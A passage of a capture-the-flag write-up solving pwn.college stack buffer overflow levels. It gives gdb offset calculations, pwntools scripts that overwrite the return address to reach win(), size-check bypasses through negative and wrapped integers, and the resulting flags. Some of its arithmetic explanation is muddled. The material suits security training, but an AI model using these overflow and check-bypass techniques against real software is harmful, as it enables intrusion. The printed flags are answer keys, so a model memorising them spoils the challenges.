| 0x00007ffe412b7120 (rsp+0x0030) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe412b7128 (rsp+0x0038) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe412b7130 (rsp+0x0040) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe412b7138 (rsp+0x0048) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe412b7140 (rsp+0x0050) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe412b7148 (rsp+0x0058) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe412b7150 (rsp+0x0060) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe412b7158 (rsp+0x0068) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe412b7160 (rsp+0x0070) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe412b7168 (rsp+0x0078) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe412b7170 (rsp+0x0080) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe412b7178 (rsp+0x0088) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe412b7180 (rsp+0x0090) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe412b7188 (rsp+0x0098) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe412b7190 (rsp+0x00a0) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe412b7198 (rsp+0x00a8) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe412b71a0 (rsp+0x00b0) | 41 41 41 41 9d 00 00 00 | 0x0000009d41414141 |
| 0x00007ffe412b71a8 (rsp+0x00b8) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe412b71b0 (rsp+0x00c0) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe412b71b8 (rsp+0x00c8) | df 1c 40 00 00 00 00 00 | 0x0000000000401cdf |
+---------------------------------+-------------------------+--------------------+
The program's memory status:
- the input buffer starts at 0x4141414141414141
- the saved frame pointer (of main) is at 0x7ffe412b71b0
- the saved return address (previously to main) is at 0x7ffe412b71b8
- the saved return address is now pointing to 0x401cdf.
- the address of win() is 0x401cdf.

If you have managed to overwrite the return address with the correct value,
challenge() will jump straight to win() when it returns.
Let's try it now!

Goodbye!
You win! Here is your flag:
pwn.college{UNv8avW5fgwLVTv-ftvuMLA33Gi.01M5IDL4czN0czW}


[*] Got EOF while reading in interactive
```

### Flag

> pwn.college{UNv8avW5fgwLVTv-ftvuMLA33Gi.01M5IDL4czN0czW}


---

## level3.1


### Challenge

```
Overflow a buffer and smash the stack to obtain the flag, but this time bypass a check designed to prevent you from doing so!
```

### Solving

I first find the buffer's address which is similar to 1.1. Now when trying to find the address of the return address its a bit more difficult. We first use info frame which shows us the saved addresses. Now from here we see ``rip`` and ``rbp``. The saved rip contains the return address and the saved register shows the address of the return address.

```
(gdb) info frame
Stack level 0, frame at 0x7fffb275d7c0:
 rip = 0x401b28 in challenge; saved rip = 0x401c3b
 called by frame at 0x7fffb275e7f0
 Arglist at 0x7fffb275d7b0, args: 
 Locals at 0x7fffb275d7b0, Previous frame's sp is 0x7fffb275d7c0
 Saved registers:
  rbp at 0x7fffb275d7b0, rip at 0x7fffb275d7b8
```

Hence we can just subtract the address of buffer and the return address.

Lastly for the address of specific function we can do ``info function-name``

136 offset with the need to pass this -> ``x401922``

```shell
(gdb) set disassembly-flavor intel
(gdb) start
Temporary breakpoint 1 at 0x401b7d
Starting program: /challenge/babymem-level-3-1 

Temporary breakpoint 1, 0x0000000000401b7d in main ()
(gdb) info frame
Stack level 0, frame at 0x7fffb275e7f0:
 rip = 0x401b7d in main; saved rip = 0x76f07338c083
 Arglist at 0x7fffb275e7e0, args: 
 Locals at 0x7fffb275e7e0, Previous frame's sp is 0x7fffb275e7f0
 Saved registers:
  rbp at 0x7fffb275e7e0, rip at 0x7fffb275e7e8
(gdb) b *challenge+0xff
Breakpoint 2 at 0x401b28
(gdb) c
Continuing.
###
### Welcome to /challenge/babymem-level-3-1!
###

Payload size: 100
Send your payload (up to 100 bytes)!

Breakpoint 2, 0x0000000000401b28 in challenge ()
(gdb) x/gx $rsi
0x7fffb275d730:	0x0000000000000000
(gdb) info frame
Stack level 0, frame at 0x7fffb275d7c0:
 rip = 0x401b28 in challenge; saved rip = 0x401c3b
 called by frame at 0x7fffb275e7f0
 Arglist at 0x7fffb275d7b0, args: 
 Locals at 0x7fffb275d7b0, Previous frame's sp is 0x7fffb275d7c0
 Saved registers:
  rbp at 0x7fffb275d7b0, rip at 0x7fffb275d7b8
(gdb) p 0x7fffb275d7b0 - 0x7fffb275d730
$1 = 128
(gdb) p 0x7fffb275d7b8 - 0x7fffb275d7b8
$2 = 0
(gdb) p 0x7fffb275d7b8 - 0x7fffb275d730
$3 = 136
(gdb) x/i win
   0x401922 <win>:	endbr64
(gdb) q
```

We write this cool script ->


```python
from pwn import *

p = process('/challenge/babymem-level-3-1')

p.sendline(b"200")

payload = b"A" * 136 + b"\x22\x19\x40\x00"
p.send(payload)

p.interactive()
```

output -> 

```shell
hacker@memory-errors~level3-1:~$ python scriptfinal.py 
[+] Starting local process '/challenge/babymem-level-3-1': pid 9807
[*] Switching to interactive mode
[*] Process '/challenge/babymem-level-3-1' stopped with exit code -11 (SIGSEGV) (pid 9807)
###
### Welcome to /challenge/babymem-level-3-1!
###

Payload size: Send your payload (up to 200 bytes)!
Goodbye!
You win! Here is your flag:
pwn.college{wE6fNYMmp34zmErjhBsIn7HPaPL.0FN5IDL4czN0czW}


[*] Got EOF while reading in interactive
```

### Flag

> pwn.college{wE6fNYMmp34zmErjhBsIn7HPaPL.0FN5IDL4czN0czW}

---

## level 4.0

### Challenge

### Solving

At first the challenge seems extremely straightforward ``104`` jump forward payload in in endian for the address of win being ``x4016a9`` but little did i know


**Initial Script**
```python
from pwn import *

p = process('/challenge/babymem-level-4-0')

p.sendline(b"200")

payload = b"A" * 104 + b"\xa9\x16\x40\x00"
p.send(payload)

p.interactive()
```

```shell
hacker@memory-errors~level4-0:~$ python3 script.py
[+] Starting local process '/challenge/babymem-level-4-0': pid 592
[*] Switching to interactive mode
[*] Process '/challenge/babymem-level-4-0' stopped with exit code 1 (pid 592)
###
### Welcome to /challenge/babymem-level-4-0!
###

The challenge() function has just been launched!
Before we do anything, let's take a look at challenge()'s stack frame:
+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffe91184340 (rsp+0x0000) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
| 0x00007ffe91184348 (rsp+0x0008) | 08 55 18 91 fe 7f 00 00 | 0x00007ffe91185508 |
| 0x00007ffe91184350 (rsp+0x0010) | f8 54 18 91 fe 7f 00 00 | 0x00007ffe911854f8 |
| 0x00007ffe91184358 (rsp+0x0018) | 0a 00 00 00 01 00 00 00 | 0x000000010000000a |
| 0x00007ffe91184360 (rsp+0x0020) | a0 c6 d8 75 13 7a 00 00 | 0x00007a1375d8c6a0 |
| 0x00007ffe91184368 (rsp+0x0028) | 20 50 40 00 00 00 00 00 | 0x0000000000405020 |
| 0x00007ffe91184370 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe91184378 (rsp+0x0038) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe91184380 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe91184388 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe91184390 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe91184398 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe911843a0 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe911843a8 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe911843b0 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe911843b8 (rsp+0x0078) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe911843c0 (rsp+0x0080) | 00 00 18 91 fe 7f 00 00 | 0x00007ffe91180000 |
| 0x00007ffe911843c8 (rsp+0x0088) | 70 43 18 91 fe 7f 00 00 | 0x00007ffe91184370 |
| 0x00007ffe911843d0 (rsp+0x0090) | 00 54 18 91 fe 7f 00 00 | 0x00007ffe91185400 |
| 0x00007ffe911843d8 (rsp+0x0098) | 5a 1e 40 00 00 00 00 00 | 0x0000000000401e5a |
+---------------------------------+-------------------------+--------------------+
Our stack pointer points to 0x7ffe91184340, and our base pointer points to 0x7ffe911843d0.
This means that we have (decimal) 20 8-byte words in our stack frame,
including the saved base pointer and the saved return address, for a
total of 160 bytes.
The input buffer begins at 0x7ffe91184370, partway through the stack frame,
("above" it in the stack are other local variables used by the function).
Your input will be read into this buffer.
The buffer is 82 bytes long, but the program will let you provide an arbitrarily
large input length, and thus overflow the buffer.

In this level, there is no "win" variable.
You will need to force the program to execute the win() function
by directly overflowing into the stored return address back to main,
which is stored at 0x7ffe911843d8, 104 bytes after the start of your input buffer.
That means that you will need to input at least 112 bytes (82 to fill the buffer,
22 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).

We have disabled the following standard memory corruption mitigations for this challenge:
- the canary is disabled, otherwise you would corrupt it before
overwriting the return address, and the program would abort.
- the binary is *not* position independent. This means that it will be
located at the same spot every time it is run, which means that by
analyzing the binary (using objdump or reading this output), you can
know the exact value that you need to overwrite the return address with.

Payload size: This challenge is more careful: it will check to make sure you
don't want to provide so much data that the input buffer will
overflow. But recall twos compliment, look at how the check is
implemented, and try to beat it!
Provided size is too large!
[*] Got EOF while reading in interactive
$ 
[*] Interrupted
```
The challenge mentions that the program performs a check on the provided input size to ensure it doesn`t exceed a certain limit.

Hence lets first go into ida and see what this check exactly does. 
```c
if ( SLODWORD(nbytes[0]) > 82 )
  {
    puts("Provided size is too large!");
    exit(1);
  }
```

Nowupon further inspection there is an easier way to do this which is by using the payload of ``-1`` This is because when -1 is stored it is done so in 2s complement as such done so in all ``111111111111`` as such hence we get a big value. Luckily this beats the check and gives us all of this possible bytes to make our payload :D

**Altered Final Script:**

```python
from pwn import *

p = process('/challenge/babymem-level-4-0')

p.sendline(b"-1")

payload = b"A" * 104 + b"\xa9\x16\x40\x00"
p.send(payload)

p.interactive()
```

Hence solved :D

```shell
hacker@memory-errors~level4-0:~$ python3 script.py
[+] Starting local process '/challenge/babymem-level-4-0': pid 628
[*] Switching to interactive mode
[*] Process '/challenge/babymem-level-4-0' stopped with exit code -11 (SIGSEGV) (pid 628)
###
### Welcome to /challenge/babymem-level-4-0!
###

The challenge() function has just been launched!
Before we do anything, let's take a look at challenge()'s stack frame:
+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffebf758f00 (rsp+0x0000) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
| 0x00007ffebf758f08 (rsp+0x0008) | c8 a0 75 bf fe 7f 00 00 | 0x00007ffebf75a0c8 |
| 0x00007ffebf758f10 (rsp+0x0010) | b8 a0 75 bf fe 7f 00 00 | 0x00007ffebf75a0b8 |
| 0x00007ffebf758f18 (rsp+0x0018) | 0a 00 00 00 01 00 00 00 | 0x000000010000000a |
| 0x00007ffebf758f20 (rsp+0x0020) | a0 56 f6 13 d6 72 00 00 | 0x000072d613f656a0 |
| 0x00007ffebf758f28 (rsp+0x0028) | 20 50 40 00 00 00 00 00 | 0x0000000000405020 |
| 0x00007ffebf758f30 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffebf758f38 (rsp+0x0038) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffebf758f40 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffebf758f48 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffebf758f50 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffebf758f58 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffebf758f60 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffebf758f68 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffebf758f70 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffebf758f78 (rsp+0x0078) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffebf758f80 (rsp+0x0080) | 00 00 75 bf fe 7f 00 00 | 0x00007ffebf750000 |
| 0x00007ffebf758f88 (rsp+0x0088) | 30 8f 75 bf fe 7f 00 00 | 0x00007ffebf758f30 |
| 0x00007ffebf758f90 (rsp+0x0090) | c0 9f 75 bf fe 7f 00 00 | 0x00007ffebf759fc0 |
| 0x00007ffebf758f98 (rsp+0x0098) | 5a 1e 40 00 00 00 00 00 | 0x0000000000401e5a |
+---------------------------------+-------------------------+--------------------+
Our stack pointer points to 0x7ffebf758f00, and our base pointer points to 0x7ffebf758f90.
This means that we have (decimal) 20 8-byte words in our stack frame,
including the saved base pointer and the saved return address, for a
total of 160 bytes.
The input buffer begins at 0x7ffebf758f30, partway through the stack frame,
("above" it in the stack are other local variables used by the function).
Your input will be read into this buffer.
The buffer is 82 bytes long, but the program will let you provide an arbitrarily
large input length, and thus overflow the buffer.

In this level, there is no "win" variable.
You will need to force the program to execute the win() function
by directly overflowing into the stored return address back to main,
which is stored at 0x7ffebf758f98, 104 bytes after the start of your input buffer.
That means that you will need to input at least 112 bytes (82 to fill the buffer,
22 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).

We have disabled the following standard memory corruption mitigations for this challenge:
- the canary is disabled, otherwise you would corrupt it before
overwriting the return address, and the program would abort.
- the binary is *not* position independent. This means that it will be
located at the same spot every time it is run, which means that by
analyzing the binary (using objdump or reading this output), you can
know the exact value that you need to overwrite the return address with.

Payload size: This challenge is more careful: it will check to make sure you
don't want to provide so much data that the input buffer will
overflow. But recall twos compliment, look at how the check is
implemented, and try to beat it!
You made it past the check! Because the read() call will interpret
your size differently than the check above, the resulting read will
be unstable and might fail. You will likely have to try this several
times before your input is actually read.
You have chosen to send -1 bytes of input!
This will allow you to write from 0x7ffebf758f30 (the start of the input buffer)
right up to (but not including) 0x7ffebf758f2f (which is -83 bytes beyond the end of the buffer).
Of these, you will overwrite -105 bytes into the return address.
If that number is greater than 8, you will overwrite the entire return address.

You will want to overwrite the return value from challenge()
(located at 0x7ffebf758f98, 104 bytes past the start of the input buffer)
with 0x4016a9, which is the address of the win() function.
This will cause challenge() to return directly into the win() function,
which will in turn give you the flag.
Keep in mind that you will need to write the address of the win() function
in little-endian (bytes backwards) so that it is interpreted properly.

Send your payload (up to -1 bytes)!
You sent 108 bytes!
Let's see what happened with the stack:

+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffebf758f00 (rsp+0x0000) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
| 0x00007ffebf758f08 (rsp+0x0008) | c8 a0 75 bf fe 7f 00 00 | 0x00007ffebf75a0c8 |
| 0x00007ffebf758f10 (rsp+0x0010) | b8 a0 75 bf fe 7f 00 00 | 0x00007ffebf75a0b8 |
| 0x00007ffebf758f18 (rsp+0x0018) | 0a 00 00 00 01 00 00 00 | 0x000000010000000a |
| 0x00007ffebf758f20 (rsp+0x0020) | a0 56 f6 13 d6 72 00 00 | 0x000072d613f656a0 |
| 0x00007ffebf758f28 (rsp+0x0028) | 20 50 40 00 ff ff ff ff | 0xffffffff00405020 |
| 0x00007ffebf758f30 (rsp+0x0030) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffebf758f38 (rsp+0x0038) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffebf758f40 (rsp+0x0040) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffebf758f48 (rsp+0x0048) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffebf758f50 (rsp+0x0050) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffebf758f58 (rsp+0x0058) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffebf758f60 (rsp+0x0060) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffebf758f68 (rsp+0x0068) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffebf758f70 (rsp+0x0070) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffebf758f78 (rsp+0x0078) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffebf758f80 (rsp+0x0080) | 41 41 41 41 6c 00 00 00 | 0x0000006c41414141 |
| 0x00007ffebf758f88 (rsp+0x0088) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffebf758f90 (rsp+0x0090) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffebf758f98 (rsp+0x0098) | a9 16 40 00 00 00 00 00 | 0x00000000004016a9 |
+---------------------------------+-------------------------+--------------------+
The program's memory status:
- the input buffer starts at 0x4141414141414141
- the saved frame pointer (of main) is at 0x7ffebf758f90
- the saved return address (previously to main) is at 0x7ffebf758f98
- the saved return address is now pointing to 0x4016a9.
- the address of win() is 0x4016a9.

If you have managed to overwrite the return address with the correct value,
challenge() will jump straight to win() when it returns.
Let's try it now!

Goodbye!
You win! Here is your flag:
pwn.college{4rbIHCbV7rMHfqxKr5uLydFhA7g.0VN5IDL4czN0czW}


[*] Got EOF while reading in interactive
```

### Flag

>pwn.college{4rbIHCbV7rMHfqxKr5uLydFhA7g.0VN5IDL4czN0czW}


---

## level4.1

### Challenge

```
Overflow a buffer and smash the stack to obtain the flag, but this time bypass a check designed to prevent you from doing so!
```

### Solving

like the last .1 challenges we do not get a description as such lets first shove this into ida and lets take a look at the code.

We first see the if statement preventing payload input above 54. We also see no variable condition for win but the win function.

From this we can assume its like 3.1 where we have to use the return address of the ``challenge`` to traverse to ``win``


Hence lets first find the offset of where the buffer is placed vs the return address then change the return address to go to win.

```shell
(gdb)  set disassembly-flavor intel
(gdb) start
Temporary breakpoint 1 at 0x401ab1
Starting program: /challenge/babymem-level-4-1 

Temporary breakpoint 1, 0x0000000000401ab1 in main ()
(gdb) b *challenge+0xd1
Breakpoint 2 at 0x401a5c
(gdb) c
Continuing.
###
### Welcome to /challenge/babymem-level-4-1!
###

Payload size: 20
Send your payload (up to 20 bytes)!

Breakpoint 2, 0x0000000000401a5c in challenge ()
(gdb) x/gx $rsi
0x7ffdfaf0fd70:	0x0000000000000000
(gdb) info frame
Stack level 0, frame at 0x7ffdfaf0fdd0:
 rip = 0x401a5c in challenge; saved rip = 0x401b6f
 called by frame at 0x7ffdfaf10e00
 Arglist at 0x7ffdfaf0fdc0, args: 
 Locals at 0x7ffdfaf0fdc0, Previous frame's sp is 0x7ffdfaf0fdd0
 Saved registers:
  rbp at 0x7ffdfaf0fdc0, rip at 0x7ffdfaf0fdc8
(gdb) p 0x7ffdfaf0fdc8 - 0x7ffdfaf0fd70
$1 = 88
(gdb) x/i win
   0x401884 <win>:	endbr64
(gdb) 
```


formatting script ->

```python
from pwn import *

p = process('/challenge/babymem-level-4-1')

p.sendline(b"-1")

payload = b"A" * 88 + b"\x84\x18\x40\x00"
p.send(payload)

p.interactive()
```

```shell
hacker@memory-errors~level4-1:~$ nano scripttry.py 
hacker@memory-errors~level4-1:~$ python3 scripttry.py
[+] Starting local process '/challenge/babymem-level-4-1': pid 866
[*] Switching to interactive mode
[*] Process '/challenge/babymem-level-4-1' stopped with exit code -11 (SIGSEGV) (pid 866)
###
### Welcome to /challenge/babymem-level-4-1!
###

Payload size: Send your payload (up to -1 bytes)!
Goodbye!
You win! Here is your flag:
pwn.college{I7hF-kss6z-fw-eTTrCRdK2A6_L.0lN5IDL4czN0czW}


[*] Got EOF while reading in interactive
```


### Flag

> pwn.college{I7hF-kss6z-fw-eTTrCRdK2A6_L.0lN5IDL4czN0czW}

---

## level5.0

### Challenge

```
Overflow a buffer and smash the stack to obtain the flag, but this time bypass another check designed to prevent you from doing so!
```

### Solving

Now upon looking at the code in IDE we realise that there is a new check in place D:

```c
printf("Number of payload records to send: ");
  __isoc99_scanf("%u", &v9);
  if ( !v9 )
    __assert_fail("record_num > 0", "/challenge/babymem-level-5-0.c", 0x8Fu, "challenge");
  printf("Size of each payload record: ");
  __isoc99_scanf("%u", &v8);
  if ( !v8 )
    __assert_fail("record_size > 0", "/challenge/babymem-level-5-0.c", 0x92u, "challenge");
  if ( v8 * v9 > 0x35 )
    __assert_fail("record_size * record_num <= 53", "/challenge/babymem-level-5-0.c", 0x93u, "challenge");
  nbytes = v8 * (unsigned __int64)v9;
```

Also the fact that -> 

```c
unsigned int v8; // [rsp+28h] [rbp-58h] BYREF
unsigned int v9; // [rsp+2Ch] [rbp-54h] BYREF
```

This meant that we cannot pass -1 as first v8 and v9 can only accept unsigned integers and the use of ``%u`` means that it can only accept signed integers as well. We are also only working with 32 bit unsigned integers as well.

Now the way we can exploit it is actual simple maths the maximum integer unsigned int can have is ``4294967295`` if there was even an extra 1 it would overflow becoming 0. Now our job is to make sure  that v8 * v9 ends up as below 88 offset allowing us to do our work. So why don't we make it 0 hence not asserting us as a failure.

To do this we can just multiply 2 and half of ``4294967295`` which is ``2147483648`` as such we get  ``4294967295`` resulting in 0 bypassing the checking condition hence allowing us to move forward with our lives :D



So this is when we could pass just 

```python
from pwn import *

p = process('/challenge/babymem-level-5-0')

p.sendline(b"2")
p.sendline(b"2147483648")

payload = b"A" * 88 + b"\xff\x15\x40\x00"

p.send(payload)

p.interactive()
```

```shell
hacker@memory-errors~level5-0:~$ python3 script.py
[+] Starting local process '/challenge/babymem-level-5-0': pid 494
[*] Switching to interactive mode
[*] Process '/challenge/babymem-level-5-0' stopped with exit code -11 (SIGSEGV) (pid 494)
###
### Welcome to /challenge/babymem-level-5-0!
###

The challenge() function has just been launched!
Before we do anything, let's take a look at challenge()'s stack frame:
+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffee47b5ad0 (rsp+0x0000) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
| 0x00007ffee47b5ad8 (rsp+0x0008) | 88 6c 7b e4 fe 7f 00 00 | 0x00007ffee47b6c88 |
| 0x00007ffee47b5ae0 (rsp+0x0010) | 78 6c 7b e4 fe 7f 00 00 | 0x00007ffee47b6c78 |
| 0x00007ffee47b5ae8 (rsp+0x0018) | 20 50 40 00 01 00 00 00 | 0x0000000100405020 |
| 0x00007ffee47b5af0 (rsp+0x0020) | 40 15 47 38 a0 75 00 00 | 0x000075a038471540 |
| 0x00007ffee47b5af8 (rsp+0x0028) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffee47b5b00 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffee47b5b08 (rsp+0x0038) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffee47b5b10 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffee47b5b18 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffee47b5b20 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffee47b5b28 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffee47b5b30 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffee47b5b38 (rsp+0x0068) | 20 1e 40 00 00 00 00 00 | 0x0000000000401e20 |
| 0x00007ffee47b5b40 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffee47b5b48 (rsp+0x0078) | 00 5b 7b e4 fe 7f 00 00 | 0x00007ffee47b5b00 |
| 0x00007ffee47b5b50 (rsp+0x0080) | 80 6b 7b e4 fe 7f 00 00 | 0x00007ffee47b6b80 |
| 0x00007ffee47b5b58 (rsp+0x0088) | 0b 1e 40 00 00 00 00 00 | 0x0000000000401e0b |
+---------------------------------+-------------------------+--------------------+
Our stack pointer points to 0x7ffee47b5ad0, and our base pointer points to 0x7ffee47b5b50.
This means that we have (decimal) 18 8-byte words in our stack frame,
including the saved base pointer and the saved return address, for a
total of 144 bytes.
The input buffer begins at 0x7ffee47b5b00, partway through the stack frame,
("above" it in the stack are other local variables used by the function).
Your input will be read into this buffer.
The buffer is 53 bytes long, but the program will let you provide an arbitrarily
large input length, and thus overflow the buffer.

In this level, there is no "win" variable.
You will need to force the program to execute the win() function
by directly overflowing into the stored return address back to main,
which is stored at 0x7ffee47b5b58, 88 bytes after the start of your input buffer.
That means that you will need to input at least 96 bytes (53 to fill the buffer,
35 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).

We have disabled the following standard memory corruption mitigations for this challenge:
- the canary is disabled, otherwise you would corrupt it before
overwriting the return address, and the program would abort.
- the binary is *not* position independent. This means that it will be
located at the same spot every time it is run, which means that by
analyzing the binary (using objdump or reading this output), you can
know the exact value that you need to overwrite the return address with.

This challenge will let you send multiple payload records concatenated together.
It will make sure that the total payload size fits in the allocated buffer
on the stack. Can you send a carefully crafted input to break this calculation?
Number of payload records to send: Size of each payload record: Computed total payload size: 4294967296
You have chosen to send 4294967296 bytes of input!
This will allow you to write from 0x7ffee47b5b00 (the start of the input buffer)
right up to (but not including) 0x7fffe47b5b00 (which is -53 bytes beyond the end of the buffer).
Of these, you will overwrite -88 bytes into the return address.
If that number is greater than 8, you will overwrite the entire return address.

You will want to overwrite the return value from challenge()
(located at 0x7ffee47b5b58, 88 bytes past the start of the input buffer)
with 0x4015ff, which is the address of the win() function.
This will cause challenge() to return directly into the win() function,
which will in turn give you the flag.
Keep in mind that you will need to write the address of the win() function
in little-endian (bytes backwards) so that it is interpreted properly.

Send your payload (up to 4294967296 bytes)!
You sent 92 bytes!
Let's see what happened with the stack:

+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffee47b5ad0 (rsp+0x0000) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
| 0x00007ffee47b5ad8 (rsp+0x0008) | 88 6c 7b e4 fe 7f 00 00 | 0x00007ffee47b6c88 |
| 0x00007ffee47b5ae0 (rsp+0x0010) | 78 6c 7b e4 fe 7f 00 00 | 0x00007ffee47b6c78 |
| 0x00007ffee47b5ae8 (rsp+0x0018) | 20 50 40 00 01 00 00 00 | 0x0000000100405020 |
| 0x00007ffee47b5af0 (rsp+0x0020) | 40 15 47 38 a0 75 00 00 | 0x000075a038471540 |
| 0x00007ffee47b5af8 (rsp+0x0028) | 00 00 00 80 02 00 00 00 | 0x0000000280000000 |
| 0x00007ffee47b5b00 (rsp+0x0030) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffee47b5b08 (rsp+0x0038) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffee47b5b10 (rsp+0x0040) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffee47b5b18 (rsp+0x0048) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffee47b5b20 (rsp+0x0050) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffee47b5b28 (rsp+0x0058) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffee47b5b30 (rsp+0x0060) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffee47b5b38 (rsp+0x0068) | 41 41 41 41 5c 00 00 00 | 0x0000005c41414141 |
| 0x00007ffee47b5b40 (rsp+0x0070) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffee47b5b48 (rsp+0x0078) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffee47b5b50 (rsp+0x0080) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffee47b5b58 (rsp+0x0088) | ff 15 40 00 00 00 00 00 | 0x00000000004015ff |
+---------------------------------+-------------------------+--------------------+
The program's memory status:
- the input buffer starts at 0x4141414141414141
- the saved frame pointer (of main) is at 0x7ffee47b5b50
- the saved return address (previously to main) is at 0x7ffee47b5b58
- the saved return address is now pointing to 0x4015ff.
- the address of win() is 0x4015ff.

If you have managed to overwrite the return address with the correct value,
challenge() will jump straight to win() when it returns.
Let's try it now!

Goodbye!
You win! Here is your flag:
pwn.college{8Bs6pPiWxgq0X2EmbIuuSEM3y_t.01N5IDL4czN0czW}


[*] Got EOF while reading in interactive
